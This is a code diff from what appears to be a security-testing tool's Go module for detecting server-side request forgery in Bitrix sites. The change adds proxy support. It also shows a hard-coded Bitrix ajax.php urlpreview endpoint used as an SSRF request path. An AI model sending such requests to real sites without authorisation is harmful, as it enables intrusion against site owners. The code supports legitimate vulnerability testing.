@@ -3,8 +3,9 @@ package ssrf
 import (
 	"bytes"
 	"fmt"
-	"net/http"
 	"github.com/indigo-sadland/quick-tricks/modules/tokens"
+	"github.com/indigo-sadland/quick-tricks/utils/netclient"
+	"net/http"
 	"strings"
 )
 
@@ -14,11 +15,11 @@ const (
 	endpoint3 = `/bitrix/services/main/ajax.php?action=attachUrlPreview&show_actions=y&buildd_preview=y&die_step=3&admin_section=Y&show_cache_stat1=Y&clear_cache=Y&c=bitrix:main.urlpreview&mode=ajax&=&sessid=<SESSID>&signedParamsString=1.12&listSubscribeId[]=1&itemId=1&deleteSubscribe=Y&userFieldId=0&elementId=1`
 )
 
-func Detect(target, server string) ([][]string, []error) {
+func Detect(target, server, proxy string) ([][]string, []error) {
 	var errors []error
 	endpoints := []string{endpoint1, endpoint2, endpoint3}
 
-	compositeData, cookie, err := tokens.Get(target)
+	compositeData, cookie, err := tokens.Get(target, proxy)
 	if err != nil {
 		errors = append(errors, err)
 		return nil, errors
@@ -29,9 +30,15 @@ func Detect(target, server string) ([][]string, []error) {
 		return nil, errors
 	}
 
-	var client http.Client
 	var urls [][]string
 	var reqContent string
+
+	client, err := netclient.NewHTTPClient(proxy)
+	if err != nil {
+		err = fmt.Errorf("Unable to parse proxy string: %s", err.Error())
+		errors = append(errors, err)
+		return nil, errors
+	}
 
 	bitrixSessid := compositeData.BitrixSessid
 	for i, e := range endpoints {
